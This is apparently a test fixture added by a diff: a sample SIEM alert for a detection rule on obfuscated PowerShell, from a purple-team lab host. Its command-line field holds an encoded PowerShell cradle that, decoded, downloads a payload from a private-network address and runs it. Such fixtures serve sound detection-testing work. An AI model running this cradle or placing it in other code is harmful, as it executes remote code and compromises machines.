@@ -1,0 +1,35 @@
+{
+  "id": "test-alert-001",
+  "timestamp": "2026-08-07T14:23:11.453Z",
+  "rule": {
+    "id": "100121",
+    "level": 12,
+    "description": "Sigma T1059.001: PowerShell encoded/obfuscated command",
+    "groups": ["powershell", "obfuscation", "mitre_execution"],
+    "mitre": {
+      "id": ["T1059.001", "T1027"],
+      "tactic": ["Execution", "Defense Evasion"]
+    }
+  },
+  "agent": {
+    "id": "003",
+    "name": "win01",
+    "ip": "10.10.10.110"
+  },
+  "data": {
+    "win": {
+      "system": {
+        "eventID": "4688",
+        "computer": "WIN01",
+        "channel": "Security"
+      },
+      "eventdata": {
+        "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "commandLine": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgA2ADAALwBwAGEAeQBsAG8AYQBkACcAKQA=",
+        "subjectUserName": "PURPLE-USER",
+        "parentProcessName": "C:\\Windows\\explorer.exe"
+      }
+    }
+  },
+  "full_log": "Aug  7 14:23:11 WinEvtLog: Security: AUDIT_SUCCESS(4688): ...powershell -nop -w hidden -enc ..."
+}
